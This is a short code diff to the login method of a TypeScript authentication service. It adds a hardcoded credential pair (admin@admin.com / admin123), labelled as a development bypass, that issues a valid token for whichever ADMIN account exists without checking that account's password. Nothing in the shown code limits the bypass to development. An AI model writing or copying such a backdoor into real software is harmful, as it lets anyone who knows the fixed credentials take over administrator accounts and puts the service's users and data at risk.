@@ -46,6 +46,17 @@ export class AuthService {
   async login(data: any): Promise<{ user: any; token: string }> {
     const { email, password } = data;
 
+    // Static Admin Bypass for Development
+    if (email === 'admin@admin.com' && password === 'admin123') {
+        const adminUser = await User.findOne({ role: 'ADMIN' });
+        if (adminUser) {
+            const token = this.generateToken(adminUser._id.toString());
+            const userObj = adminUser.toObject();
+            const { password: _, ...userClean } = userObj as any;
+            return { user: userClean, token };
+        }
+    }
+
     const user = await User.findOne({ email }).select('+password');
     if (!user) throw new Error('Invalid credentials');
 
